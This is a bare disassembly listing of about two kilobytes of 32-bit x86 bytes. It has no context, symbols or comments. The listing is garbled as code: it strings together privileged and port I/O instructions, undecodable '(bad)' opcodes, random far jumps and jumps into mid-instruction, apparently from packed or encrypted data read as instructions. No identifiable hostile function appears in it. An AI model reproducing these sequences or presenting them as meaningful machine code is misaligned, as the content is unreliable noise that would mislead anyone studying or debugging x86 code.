  40827b:	les    esp,FWORD PTR [ecx-0x49]
  40827e:	cld    
  40827f:	xchg   ebp,eax
  408280:	icebp  
  408281:	pop    ds
  408282:	ja     0x408206
  408284:	sahf   
  408285:	sbb    BYTE PTR [edi+0x20fe5cd5],ah
  40828b:	mov    cs,WORD PTR [edi]
  40828d:	retf   0x2fa3
  408290:	jb     0x408309
  408292:	jno    0x4082f4
  408294:	popf   
  408295:	cmp    DWORD PTR [edi],eax
  408297:	adc    esi,esi
  408299:	outs   dx,DWORD PTR ds:[esi]
  40829a:	outs   dx,DWORD PTR ds:[esi]
  40829b:	push   ebp
  40829c:	push   0xbefb73ee
  4082a1:	stos   DWORD PTR es:[edi],eax
  4082a2:	fisttp DWORD PTR [edi-0x66]
  4082a5:	pop    ecx
  4082a6:	sbb    esp,esp
  4082a8:	mov    ds:0xd29863cc,al
  4082ad:	sti    
  4082ae:	pop    ebx
  4082af:	repnz sub DWORD PTR [eax+0x66],0x33eba7db
  4082b7:	or     eax,0xbbdb0449
  4082bc:	ret    
  4082bd:	fadd   DWORD PTR [eax]
  4082bf:	popa   
  4082c0:	pushf  
  4082c1:	arpl   WORD PTR [ebx-0x1e],dx
  4082c4:	stos   DWORD PTR es:[edi],eax
  4082c5:	mov    al,0xa4
  4082c7:	sbb    al,0x1f
  4082c9:	cmp    al,0x45
  4082cb:	xchg   ebp,eax
  4082cc:	xchg   edx,eax
  4082cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ce:	jg     0x4082f6
  4082d0:	add    BYTE PTR [edi+0x5273b4a9],dh
  4082d6:	dec    ebp
  4082d7:	sbb    edx,DWORD PTR [ebx-0x571adbf1]
  4082dd:	mov    esi,0x61948952
  4082e2:	xchg   ebp,eax
  4082e3:	lock mov BYTE PTR [ebx],0x7b
  4082e7:	dec    esp
  4082e8:	test   eax,0xa0a68b75
  4082ed:	leave  
  4082ee:	stos   BYTE PTR es:[edi],al
  4082ef:	rcl    DWORD PTR [esi],1
  4082f1:	xor    BYTE PTR [esi+0x5f268788],cl
  4082f7:	in     eax,0x77
  4082f9:	sbb    bh,BYTE PTR [ebx]
  4082fb:	xor    DWORD PTR fs:[ebx-0x50],ebx
  4082ff:	cmp    esp,DWORD PTR [ecx-0x555fad1a]
  408305:	(bad)  
  408307:	imul   esp,DWORD PTR [edi+eiz*4],0x62
  40830b:	in     eax,dx
  40830c:	or     al,0x6f
  40830e:	int    0x52
  408310:	aad    0x72
  408312:	or     DWORD PTR [ebx-0x1b3403c1],eax
  408318:	and    edx,edx
  40831a:	fcom   DWORD PTR [ebx]
  40831c:	mov    esp,0xf8224c46
  408321:	in     eax,dx
  408322:	jle    0x40831a
  408324:	dec    ecx
  408325:	cmp    eax,0x6f70a1e4
  40832a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40832b:	shr    dh,0x42
  40832e:	repz in eax,0x2a
  408331:	cmp    DWORD PTR [ebx],ecx
  408333:	jae    0x40837c
  408335:	push   edx
  408336:	sub    ah,BYTE PTR [esi+eiz*8+0x3c]
  40833a:	daa    
  40833b:	adc    ebx,DWORD PTR [ebx+eiz*8+0x10dc6304]
  408342:	xor    al,0x2
  408344:	or     DWORD PTR [ebp+edi*2-0x2c],ecx
  408348:	ret    
  408349:	mov    ds:0x82529b92,eax
  40834e:	jns    0x408339
  408350:	mov    ds:0x10625453,eax
  408355:	adc    ah,BYTE PTR [esi+0x56]
  408358:	dec    eax
  408359:	stos   DWORD PTR es:[edi],eax
  40835a:	stos   DWORD PTR es:[edi],eax
  40835b:	cmp    DWORD PTR [eax-0x72],edx
  40835e:	cli    
  40835f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408360:	enter  0xe7a2,0x18
  408364:	push   0x27
  408366:	pop    edx
  408367:	cli    
  408368:	stos   DWORD PTR es:[edi],eax
  408369:	mov    edx,0xfb763c1
  40836e:	repz jmp 0x7b98:0x60feff41
  408376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408377:	mov    ch,0x7b
  408379:	mov    ds:0x726ef37b,al
  40837e:	out    dx,al
  40837f:	mov    ebp,0x3e02ceb6
  408384:	cmp    dh,BYTE PTR [esi-0x24]
  408387:	mov    dl,0x1c
  408389:	push   eax
  40838a:	or     DWORD PTR [edx+esi*8],esi
  40838d:	test   BYTE PTR es:[edx+0x68bf2dfc],dl
  408394:	dec    eax
  408395:	dec    ebx
  408396:	fadd   DWORD PTR [eax+0xc]
  408399:	idiv   BYTE PTR [ebp+0x5e]
  40839c:	out    0x9b,eax
  40839e:	inc    edi
  40839f:	push   esi
  4083a0:	js     0x4083bd
  4083a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083a3:	js     0x4083f6
  4083a5:	shr    DWORD PTR [eax+0x20550d84],0xf3
  4083ac:	fld1   
  4083ae:	and    esi,ebp
  4083b0:	sbb    al,0x75
  4083b2:	xchg   edi,eax
  4083b3:	dec    ebx
  4083b4:	push   edi
  4083b5:	jno    0x4083ef
  4083b7:	cmc    
  4083b8:	test   eax,0x7879810
  4083bd:	inc    esi
  4083be:	mov    al,ds:0x4e82194f
  4083c3:	xchg   edi,eax
  4083c4:	and    eax,0x9263f49c
  4083c9:	jnp    0x408406
  4083cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083cc:	xor    al,0xc7
  4083ce:	enter  0x1e6f,0x51
  4083d2:	sub    al,0x26
  4083d4:	cs dec esp
  4083d6:	(bad)  
  4083d7:	mov    ebx,0x2aae78fc
  4083dc:	pop    ebx
  4083dd:	dec    edi
  4083de:	dec    ecx
  4083df:	pushf  
  4083e0:	sbb    esp,0x78f8c8c6
  4083e6:	mov    eax,ds:0x27794f7f
  4083eb:	mov    ebp,0x3c4c4249
  4083f0:	mov    bh,0x51
  4083f2:	cdq    
  4083f3:	mov    WORD PTR [eax-0x4b5c9919],es
  4083f9:	mov    al,ds:0x31fce01
  4083fe:	es mov ah,0x47
  408401:	push   ecx
  408402:	fbld   TBYTE PTR [esi-0x4f78c5ef]
  408408:	xor    ecx,DWORD PTR [eax+0x6f]
  40840b:	add    esi,DWORD PTR [edi+0x28]
  40840e:	jecxz  0x40841d
  408410:	sub    al,0x65
  408412:	mov    dl,0x3b
  408414:	jb     0x408479
  408416:	and    ebp,0xc7e83cf5
  40841c:	cmp    dl,BYTE PTR [eax+0xc]
  40841f:	xchg   esp,eax
  408420:	jnp    0x4083ac
  408422:	jg     0x40846e
  408424:	imul   edx,edx,0xffffffbe
  408427:	fcmovnb st,st(5)
  408429:	mov    cs,ebp
  40842b:	(bad)  
  40842c:	fisub  WORD PTR [edi]
  40842e:	inc    ebp
  40842f:	or     BYTE PTR [edx-0x16],dh
  408432:	pop    eax
  408433:	loop   0x408421
  408435:	mov    eax,0x660119c
  40843a:	lods   al,BYTE PTR ds:[esi]
  40843b:	cmp    eax,0xd3361904
  408440:	add    ah,BYTE PTR [ecx]
  408442:	push   ebp
  408443:	sbb    al,0x39
  408445:	cmp    eax,0x47e507b3
  40844a:	pop    esi
  40844b:	fdivr  QWORD PTR [edi+ebx*4-0x2de8b0dd]
  408452:	mov    dl,0xbf
  408454:	mov    al,ds:0x10b1bf11
  408459:	dec    eax
  40845a:	cmp    al,0x99
  40845c:	daa    
  40845d:	inc    ebx
  40845e:	mov    esi,0x71086
  408463:	xchg   ecx,eax
  408464:	popf   
  408465:	xchg   esi,eax
  408466:	pop    ss
  408467:	shr    ch,1
  408469:	jg     0x4084da
  40846b:	popf   
  40846c:	mov    dh,0x6b
  40846e:	mov    ecx,0xd1a16490
  408473:	fdiv   DWORD PTR [ebp+0x7664f30e]
  408479:	popf   
  40847a:	cs xchg ebp,eax
  40847c:	or     eax,0x800b7ed9
  408481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408482:	(bad)  
  408483:	mov    ds:0x2c896f6f,eax
  408488:	sub    edi,DWORD PTR [edx+ebp*8]
  40848b:	xor    DWORD PTR [esi+0x79],esi
  40848e:	push   edx
  40848f:	stc    
  408490:	(bad)  
  408491:	sub    BYTE PTR [edi+0x45d4331f],ah
  408497:	loop   0x4084f8
  408499:	mov    edi,0xdcf14651
  40849e:	pop    ecx
  40849f:	mov    al,ds:0x1177e643
  4084a4:	xor    BYTE PTR [edi-0x26a1fce5],al
  4084aa:	hlt    
  4084ab:	arpl   WORD PTR [ebx+0x2d15daa9],di
  4084b1:	nop
  4084b2:	cmp    eax,0xc0e6a954
  4084b7:	mov    edx,DWORD PTR [ecx]
  4084b9:	ret    0x4b5
  4084bc:	or     BYTE PTR [eax+eax*4-0x15b30b29],0xd5
  4084c4:	stos   DWORD PTR es:[edi],eax
  4084c5:	pop    ecx
  4084c6:	popf   
  4084c7:	mov    ?,WORD PTR [ecx]
  4084c9:	call   0xb9d2:0xc089ec25
  4084d0:	xchg   DWORD PTR [ecx+0x79],esi
  4084d3:	inc    ebx
  4084d4:	or     BYTE PTR [eax],bl
  4084d6:	stc    
  4084d7:	mov    ds:0xc69e88bb,eax
  4084dc:	mov    ds:0xe70af8f8,eax
  4084e1:	mov    dl,0x57
  4084e3:	xor    ebp,DWORD PTR [ebx-0x19980670]
  4084e9:	arpl   WORD PTR [eax-0x62],cx
  4084ec:	add    esi,DWORD PTR [ebx+0x7fe244df]
  4084f2:	mov    al,ds:0xba73271c
  4084f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f8:	hlt    
  4084f9:	mov    cs,WORD PTR [ebx]
  4084fb:	or     eax,0x451f7c52
  408500:	pop    ss
  408501:	inc    esi
  408502:	add    ebp,DWORD PTR [edx-0x29]
  408505:	xlat   BYTE PTR ds:[ebx]
  408506:	sub    BYTE PTR [ebx+0x2a070c14],al
  40850c:	inc    edi
  40850d:	stos   DWORD PTR es:[edi],eax
  40850e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40850f:	add    DWORD PTR [eax+ecx*2+0x49f9f656],ebp
  408516:	js     0x408514
  408518:	adc    DWORD PTR [ecx],eax
  40851a:	retf   
  40851b:	bound  esi,QWORD PTR [ebx-0x4b]
  40851e:	js     0x408553
  408520:	mov    dh,0xb0
  408522:	or     eax,0x7d58913e
  408527:	jmp    0x3b1d3075
  40852c:	mov    dl,0x3e
  40852e:	or     edx,DWORD PTR [ecx+0x5ce8bc9e]
  408534:	pop    ebx
  408535:	sub    dh,ah
  408537:	push   ebx
  408538:	lea    edi,[edi-0x1d93de2e]
  40853e:	fiadd  WORD PTR [ebx+0x79]
  408541:	mov    ah,BYTE PTR [esi+0x249a1c34]
  408547:	das    
  408548:	inc    esi
  408549:	push   ebp
  40854a:	jmp    0x40852f
  40854c:	scas   al,BYTE PTR es:[edi]
  40854d:	fidivr DWORD PTR [edx]
  40854f:	push   eax
  408550:	inc    ecx
  408551:	loope  0x4084f9
  408553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408554:	jmp    0xc2d0:0xa74741bc
  40855b:	fxch   st(1)
  40855d:	mov    dh,0x48
  40855f:	pop    es
  408560:	fiadd  DWORD PTR [edx]
  408562:	std    
  408563:	push   0xbe6c3fa2
  408568:	shl    BYTE PTR [edi],0xaa
  40856b:	xchg   esp,eax
  40856c:	bound  esi,QWORD PTR [edi]
  40856e:	xchg   esp,eax
  40856f:	jge    0x4085ac
  408571:	lds    esi,FWORD PTR [ebx+0x2e228c1e]
  408577:	or     ecx,ecx
  408579:	loop   0x40859a
  40857b:	ror    BYTE PTR [ecx-0x5f8cef1a],cl
  408581:	pop    ds
  408582:	mov    dl,0x10
  408584:	cli    
  408585:	(bad)  
  408586:	int3   
  408587:	les    ebx,FWORD PTR [edx-0x337c7f5f]
  40858d:	pop    es
  40858e:	mov    ecx,0x7f977484
  408593:	inc    ebp
  408594:	loop   0x408580
  408596:	mov    ah,0x41
  408598:	add    al,BYTE PTR [ebx]
  40859a:	addr16 xchg edi,eax
  40859c:	vpmaxub ymm1,ymm4,YMMWORD PTR [edi-0x39475228]
  4085a4:	or     DWORD PTR [edi+0x2f],esi
  4085a7:	mov    ds,WORD PTR [ecx-0x2d567a23]
  4085ad:	mov    ebp,0xc2d576bf
  4085b2:	std    
  4085b3:	xchg   BYTE PTR [eax],al
  4085b5:	push   esp
  4085b6:	lahf   
  4085b7:	mov    WORD PTR cs:[ebp+0x2c],ss
  4085bb:	out    dx,al
  4085bc:	sbb    dl,ah
  4085be:	sti    
  4085bf:	mov    eax,DWORD PTR [esi-0x6c259c94]
  4085c5:	enter  0xd31b,0x8f
  4085c9:	repnz sbb eax,0xe158b04b
  4085d0:	xchg   ebx,eax
  4085d1:	aaa    
  4085d2:	sbb    eax,0x8503bfbd
  4085d7:	sbb    al,0x1
  4085d9:	push   0xcdf94c8a
  4085de:	ins    DWORD PTR es:[edi],dx
  4085df:	mov    ch,BYTE PTR [edi]
  4085e1:	jle    0x4085ee
  4085e3:	mov    dl,dh
  4085e5:	mov    edx,0x5d3743d5
  4085ea:	xchg   ecx,eax
  4085eb:	fmul   st(0),st
  4085ed:	outs   dx,BYTE PTR ds:[esi]
  4085ee:	mov    esi,0x58b48d10
  4085f3:	out    dx,al
  4085f4:	js     0x408657
  4085f6:	or     eax,0x88ddc982
  4085fb:	scas   eax,DWORD PTR es:[edi]
  4085fc:	mul    DWORD PTR [ebx]
  4085fe:	dec    eax
  4085ff:	inc    ebx
  408600:	retf   0x565f
  408603:	popa   
  408604:	jne    0x4085c8
  408606:	test   eax,0xee831e45
  40860b:	shr    DWORD PTR [esi-0x5863c1c7],1
  408611:	lods   eax,DWORD PTR ds:[esi]
  408612:	sbb    eax,0xde36b7fd
  408617:	mov    ecx,0xe8ec8cce
  40861c:	loop   0x4085c7
  40861e:	cs xchg ecx,eax
  408620:	and    eax,0xfad114c6
  408625:	jp     0x40865e
  408627:	push   eax
  408628:	jmp    0x86dc:0x8c085ae
  40862f:	xchg   edx,eax
  408630:	(bad)  
  408631:	jle    0x4086a9
  408633:	ds dec esi
  408635:	mov    bl,0x66
  408637:	out    0x63,eax
  408639:	jge    0x408622
  40863b:	mov    gs,WORD PTR [ebp-0x2e16a7a0]
  408641:	shl    DWORD PTR [ebx+eax*8-0x4a59891f],0x10
  408649:	mov    eax,0x786889c1
  40864e:	mov    edi,0x8dbf4b50
  408653:	inc    edx
  408654:	loope  0x40864d
  408656:	icebp  
  408657:	xchg   esi,eax
  408658:	lahf   
  408659:	inc    eax
  40865a:	mov    esp,0x409310ed
  40865f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408660:	popa   
  408661:	std    
  408662:	stc    
  408663:	jns    0x4085f5
  408665:	(bad)  [ecx-0x53]
  408668:	mov    dh,0x9a
  40866a:	push   ds
  40866b:	cmp    ebx,eax
  40866d:	mov    ebx,0x5a784004
  408672:	dec    DWORD PTR [edx-0x29]
  408675:	imul   dh
  408677:	mov    ah,cl
  408679:	push   ds
  40867a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40867b:	sar    DWORD PTR ds:0xba8b2767,0xb7
  408682:	add    eax,0x71c4ae11
  408687:	pop    eax
  408688:	inc    ecx
  408689:	stc    
  40868a:	adc    al,0x4
  40868c:	in     al,0x19
  40868e:	and    edx,DWORD PTR [ebx+0x9e49203]
  408694:	stc    
  408695:	dec    ecx
  408696:	xchg   esp,eax
  408697:	in     eax,dx
  408698:	jmp    0x4086f5
  40869a:	retf   0x6716
  40869d:	pushf  
  40869e:	iret   
  40869f:	idiv   BYTE PTR [edx+eax*8]
  4086a2:	out    dx,al
  4086a3:	inc    ebp
  4086a4:	retf   
  4086a5:	push   0x33
  4086a7:	adc    DWORD PTR [ecx],ebx
  4086a9:	pop    ss
  4086aa:	inc    edi
  4086ab:	fstp   st(3)
  4086ad:	fnsave [esi]
  4086af:	push   ebx
  4086b0:	(bad)  
  4086b1:	test   DWORD PTR [edx-0x1b],0xaebd5e4a
  4086b8:	(bad)  
  4086ba:	and    BYTE PTR [edi+0x55114c14],0xed
  4086c1:	test   al,0x5a
  4086c3:	push   ds
  4086c4:	das    
  4086c5:	dec    ebp
  4086c6:	enter  0x2bb8,0x89
  4086ca:	xchg   ecx,eax
  4086cb:	jmp    0x6dae5195
  4086d0:	inc    ebx
  4086d1:	pop    ebp
  4086d2:	aas    
  4086d3:	pop    ds
  4086d4:	cmp    al,0xe6
  4086d6:	inc    edi
  4086d7:	sbb    cl,BYTE PTR es:[edi]
  4086da:	sbb    BYTE PTR [ebp+0x7595727a],ch
  4086e0:	mov    dl,0x1d
  4086e2:	and    al,0xb9
  4086e4:	ret    0xdb04
  4086e7:	cmp    al,0x1e
  4086e9:	sub    ebp,DWORD PTR [ebx+edx*1]
  4086ec:	lds    edx,FWORD PTR [edx+0x30]
  4086ef:	adc    ah,bh
  4086f1:	test   BYTE PTR [ebx],dh
  4086f3:	fcom   QWORD PTR [ebx-0x5c289e51]
  4086f9:	jmp    0x4086c0
  4086fb:	dec    esi
  4086fc:	sub    ecx,DWORD PTR [ecx-0x46]
  4086ff:	imul   ebx,edi,0xffffff85
  408702:	xor    al,BYTE PTR [eax+edi*8-0x229f92bf]
  408709:	xor    bl,BYTE PTR [esi+0x2]
  40870c:	hlt    
  40870d:	dec    ecx
  40870e:	mov    bh,cl
  408710:	xor    al,0xd0
  408712:	pop    ebp
  408713:	fisub  WORD PTR [edx]
  408715:	mov    esi,0x52075ec1
  40871a:	loope  0x4086a6
  40871c:	sbb    ebp,ebx
  40871e:	push   0x3e
  408720:	mov    BYTE PTR [esi],bh
  408722:	cmp    BYTE PTR [ecx-0x30],ch
  408725:	call   0x1d8f:0xcbbc46aa
  40872c:	(bad)  
  40872d:	pop    edi
  40872e:	ds jl  0x408784
  408731:	push   ecx
  408732:	imul   ebp,DWORD PTR [esi+0x3a],0xffffffae
  408736:	call   0x2b3fa49f
  40873b:	sbb    BYTE PTR [eax+edx*8+0x23],dh
  40873f:	aam    0x41
  408741:	enter  0x7d40,0x23
  408745:	mov    al,ds:0x3f7f2d8b
  40874a:	imul   edi,edi,0xffffffb8
  40874d:	aam    0xaf
  40874f:	or     ebp,ebx
  408751:	add    BYTE PTR [edi],bl
  408753:	mov    bl,0x3b
  408755:	jecxz  0x408773
  408757:	repnz (bad) 
  40875a:	es ret 
  40875c:	int    0x48
  40875e:	pop    edi
  40875f:	jae    0x4087cf
  408761:	fld    QWORD PTR [eax]
  408763:	das    
  408764:	mov    ebx,DWORD PTR [ebx]
  408766:	loope  0x408731
  408768:	mov    eax,0xbf316034
  40876d:	push   ecx
  40876e:	jg     0x408707
  408770:	mov    ds:0x65267a62,eax
  408775:	adc    al,0xa6
  408777:	and    eax,0x3066bc64
  40877c:	int3   
  40877d:	cwde   
  40877e:	loope  0x4087d0
  408780:	pop    ecx
  408781:	mov    BYTE PTR [ebx],ah
  408783:	xlat   BYTE PTR ds:[ebx]
  408784:	sbb    al,0xc0
  408786:	leave  
  408787:	sub    esp,ebp
  408789:	xchg   ebx,eax
  40878a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40878c:	js     0x408722
  40878e:	or     BYTE PTR [ecx],0x86
  408791:	or     ecx,DWORD PTR [esi]
  408793:	mov    eax,0x86d1f94e
  408798:	test   DWORD PTR [ebp+0x30],ebx
  40879b:	mov    ebx,0x8d65e258
  4087a0:	(bad)  
  4087a1:	(bad)  
  4087a2:	xchg   ecx,eax
  4087a3:	pop    esi
  4087a4:	aam    0xc3
  4087a6:	das    
  4087a7:	sub    bh,BYTE PTR [ecx+0x27]
  4087aa:	aas    
  4087ab:	hlt    
  4087ac:	jnp    0x408763
  4087ae:	or     DWORD PTR [edx],edi
  4087b0:	enter  0xaa5b,0x63
  4087b4:	loope  0x4087dc
  4087b6:	cmp    ecx,DWORD PTR [ebx+eiz*1-0xc]
  4087ba:	add    BYTE PTR [edi],cl
  4087bc:	outs   dx,BYTE PTR ds:[esi]
  4087bd:	aad    0xb2
  4087bf:	inc    ecx
  4087c0:	pop    es
  4087c1:	inc    edx
  4087c2:	jl     0x408761
  4087c4:	mov    BYTE PTR ss:[edi-0x44],bl
  4087c8:	call   0xdf2c92b
  4087cd:	pop    ebp
  4087ce:	and    al,0xb8
  4087d0:	pop    eax
  4087d1:	cmp    dl,bh
  4087d3:	jnp    0x4087a6
  4087d5:	test   bl,al
  4087d7:	and    dl,BYTE PTR [ebx+0x45]
  4087da:	and    dl,BYTE PTR [edi+esi*8]
  4087dd:	push   eax
  4087de:	jno    0x408833
  4087e0:	ror    DWORD PTR [edi-0x4343735],1
  4087e6:	pop    ebp
  4087e7:	or     al,0xf3
  4087e9:	mov    ecx,0x56eb864
  4087ee:	jae    0x408852
  4087f0:	std    
  4087f1:	cmp    ebx,DWORD PTR [edi]
  4087f3:	mov    dl,0x7c
  4087f5:	stos   BYTE PTR es:[edi],al
  4087f6:	cmp    DWORD PTR [ebp+0x1f],ecx
  4087f9:	mov    ecx,0xe2a15f7e
  4087fe:	dec    esi
  4087ff:	push   ds
  408800:	and    BYTE PTR [ecx+0x3b4f0d0b],ch
  408806:	inc    esi
  408807:	ror    BYTE PTR [ebx],1
  408809:	xor    al,0xdd
  40880b:	pop    ebp
  40880c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40880d:	sub    eax,0x4f4ca4aa
  408812:	xchg   ebx,eax
  408813:	call   0xd392:0x3d304fc0
  40881a:	imul   esp,DWORD PTR [ebx-0x2],0x1e
  40881e:	outs   dx,DWORD PTR ds:[esi]
  40881f:	sbb    al,0x8b
  408821:	xor    DWORD PTR [ebp-0x2d],ebp
  408824:	and    DWORD PTR [edi],0x3b
  408827:	out    0x5a,al
  408829:	in     eax,dx
  40882a:	out    0xeb,eax
  40882c:	or     eax,0x7559dba9
  408831:	adc    DWORD PTR [eax-0x7f],edi
  408834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408835:	imul   esp,edx,0x68ad2a7a
  40883b:	pop    ebx
  40883c:	push   edx
  40883d:	out    0xe1,eax
  40883f:	mov    edx,0x45accf15
  408844:	sbb    bl,cl
  408846:	mov    ebp,DWORD PTR [esi+0x1f30ffea]
  40884c:	stos   DWORD PTR es:[edi],eax
  40884d:	nop
  40884e:	repz mov ds:0x41452580,al
  408854:	cli    
  408855:	pop    ebx
  408856:	call   0x1242:0xfa85c861
  40885d:	js     0x408898
  40885f:	adc    esi,edi
  408861:	cmp    WORD PTR [edx-0x3419be76],0xfff4
  408869:	mov    BYTE PTR [ecx+0x59],bh
  40886c:	stc    
  40886d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40886e:	mov    al,ds:0x4f249e41
  408873:	shl    DWORD PTR [edx+esi*1+0x75fc958f],0xd5
  40887b:	mov    ecx,0xa045d94e
  408880:	mov    ds:0xed4e7d0a,eax
  408885:	push   0xffffffdc
  408887:	and    al,0x82
  408889:	xlat   BYTE PTR ds:[ebx]
  40888a:	ins    DWORD PTR es:[edi],dx
  40888b:	mov    al,0xc1
  40888d:	pusha  
  40888e:	(bad)  
  408890:	aad    0xcf
  408892:	ins    BYTE PTR es:[edi],dx
  408893:	mov    eax,ds:0xcda99b89
  408898:	jae    0x4088b7
  40889a:	imul   ebp,ebp,0x4807c60b
  4088a0:	jb     0x408872
  4088a2:	fmul   DWORD PTR [ebx]
  4088a4:	jbe    0x408867
  4088a6:	lods   eax,DWORD PTR ds:[esi]
  4088a7:	in     eax,dx
  4088a8:	in     eax,0xa
  4088aa:	push   eax
  4088ab:	fwait
  4088ac:	enter  0x934a,0x18
  4088b0:	int3   
  4088b1:	jno    0x408865
  4088b3:	push   ebp
  4088b4:	ret    
  4088b5:	cs aad 0x3d
  4088b8:	mov    eax,DWORD PTR [edx-0x44]
  4088bb:	sbb    ch,BYTE PTR cs:[edi+eax*4-0x11]
  4088c0:	cmp    dl,BYTE PTR [esi-0x2a]
  4088c3:	mov    eax,0xb10f68d2
  4088c8:	inc    esp
  4088c9:	fld    QWORD PTR ds:0xddb18f75
  4088cf:	mov    DWORD PTR ds:[edx+0x1b59af9f],esp
  4088d6:	cmp    al,BYTE PTR [edx+0x3d]
  4088d9:	test   edi,0x57a68717
  4088df:	mov    cl,0x3
  4088e1:	sbb    eax,0x2f11dc55
  4088e6:	ds call 0x4ccd:0x8e49b8bb
  4088ee:	mov    WORD PTR ds:0xe32c8ec6,?
  4088f4:	std    
  4088f5:	stos   DWORD PTR es:[edi],eax
  4088f6:	jge    0x4088c5
  4088f8:	sbb    al,0x4f
  4088fa:	addr16 mov sp,0xea9
  4088ff:	fisttp QWORD PTR [eax]
  408901:	mov    ss,WORD PTR [eax+0x30]
  408904:	push   esi
  408905:	mov    edi,0x5bd7da3e
  40890a:	cmp    bl,ch
  40890c:	scas   eax,DWORD PTR es:[edi]
  40890d:	mov    ebx,0x2b05556f
  408912:	test   BYTE PTR ds:0x4743baba,dl
  408918:	pop    esp
  408919:	dec    eax
  40891a:	pop    es
  40891b:	or     BYTE PTR [ebp-0x7c],ah
  40891e:	jns    0x40894c
  408920:	jge    0x40899f
  408922:	jae    0x40894f
  408924:	shl    BYTE PTR [edx-0xa],1
  408927:	pusha  
  408928:	stos   BYTE PTR es:[edi],al
  408929:	lds    ebp,FWORD PTR [eax+ebx*1-0x4d]
  40892d:	xchg   edi,eax
  40892e:	mov    DWORD PTR [eax],ebx
  408930:	in     eax,dx
  408931:	enter  0x3f09,0xe0
  408935:	and    al,0xfd
  408937:	or     DWORD PTR [eax+0x45],0x14
  40893b:	out    0x21,al
  40893d:	jno    0x408916
  40893f:	stos   BYTE PTR es:[edi],al
  408940:	xor    al,0x9c
  408942:	pop    es
  408943:	jmp    0x408937
  408945:	cmp    DWORD PTR [edx+0x0],esi
  408948:	shl    bh,cl
  40894a:	push   ss
  40894b:	mov    ebx,0xcaca47da
  408950:	dec    edx
  408951:	dec    esi
  408952:	xor    al,0xeb
  408954:	fsub   DWORD PTR [ebp-0x42156b23]
  40895a:	test   al,0xfe
  40895c:	and    cl,BYTE PTR [edx-0x2fab085b]
  408962:	ja     0x408993
  408964:	stos   BYTE PTR es:[edi],al
  408965:	inc    edi
  408966:	jno    0x4089a5
  408968:	sbb    bh,BYTE PTR [ebx-0x41]
  40896b:	adc    al,0xc8
  40896d:	out    0x96,al
  40896f:	adc    eax,0x6f837aa9
  408974:	adc    al,BYTE PTR [esi+0x7b]
  408977:	sbb    al,0x5
  408979:	and    edx,DWORD PTR [ebp-0xd]
  40897c:	jns    0x408919
  40897e:	dec    ebx
  40897f:	(bad)  
  408980:	or     al,BYTE PTR [edi+ebp*2]
  408983:	cdq    
  408984:	in     al,0x89
  408986:	sub    ebp,DWORD PTR [esi]
  408988:	fstp   QWORD PTR [edi+0x43428acb]
  40898e:	cmc    
  40898f:	pushf  
  408990:	outs   dx,DWORD PTR ds:[esi]
  408991:	push   ebx
  408992:	or     eax,0xb17c44fa
  408997:	xchg   edx,eax
  408998:	add    DWORD PTR [edi-0x133ec35e],ebp
  40899e:	pop    esp
  40899f:	es dec ebx
  4089a1:	sbb    eax,eax
  4089a3:	sub    dh,dh
  4089a5:	or     ch,BYTE PTR [edx]
  4089a7:	test   DWORD PTR [eax+0x62],edi
  4089aa:	jne    0x408a0e
  4089ac:	les    esp,FWORD PTR [edx-0x62]
  4089af:	cmp    DWORD PTR [ebx-0x502ea447],0x7d
  4089b6:	aad    0x25
  4089b8:	mov    ds:0x9e692cb2,al
  4089bd:	int    0xf8
  4089bf:	inc    esp
  4089c0:	repnz out dx,al
  4089c2:	push   0xffffffe3
  4089c4:	das    
  4089c5:	out    dx,al
  4089c6:	iret   
  4089c7:	out    0xc7,eax
  4089c9:	ds pop ecx
  4089cb:	mov    esi,0x9a55c11d
  4089d0:	jp     0x408a15
  4089d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089d3:	fisttp WORD PTR [ecx+0x5f]
  4089d6:	ret    
  4089d7:	adc    eax,0x137b77cf
  4089dc:	sbb    eax,0x76510a92
  4089e1:	xor    DWORD PTR [ebp+ebp*1+0x6d],ebx
  4089e5:	mov    dh,BYTE PTR [ecx+0x1]
  4089e8:	jmp    0x4dbe:0x4c8e224a
  4089ef:	jecxz  0x4089e7
  4089f1:	mov    WORD PTR ds:0xf40fb9de,es
  4089f7:	cmp    ah,BYTE PTR es:[ebp-0x28]
  4089fb:	fcomp  QWORD PTR [edi+ebp*2-0x607f94b1]
  408a02:	xor    eax,0x45f16517
  408a07:	xchg   ebp,eax
  408a08:	outs   dx,BYTE PTR ds:[esi]
  408a09:	mov    BYTE PTR [edi-0x53a5f3e],ch
  408a0f:	inc    edi
  408a10:	test   BYTE PTR ds:0x6f9bc76e,ch
  408a16:	retf   
  408a17:	sahf   
  408a18:	sar    DWORD PTR [esi+0x45c0d1cd],1
  408a1e:	mov    ecx,0xb4ec82bb
  408a23:	mov    esi,0x6ded8c13
  408a28:	cmp    al,0x88
  408a2a:	js     0x4089d2
  408a2c:	loope  0x408a76
  408a2e:	push   0xbc2ff8dd
  408a33:	add    DWORD PTR [esi],edi
  408a35:	sub    eax,0xc989bf65
  408a3a:	call   0x8028:0x433b875b
  408a41:	in     eax,0xc2
  408a43:	and    esp,DWORD PTR [ebp+0x4bf990e3]
  408a49:	cli    
  408a4a:	mov    DWORD PTR ds:0xe354f7c2,0x787aae64
  408a54:	inc    ebx
  408a55:	scas   al,BYTE PTR es:[edi]
  408a56:	jmp    0x3f976aa8
  408a5b:	xchg   eax,edi
  408a5d:	cmp    al,0x5b
  408a5f:	jnp    0x408a00
  408a61:	push   esi
  408a62:	xchg   esi,eax
  408a63:	fs mov ah,0x13
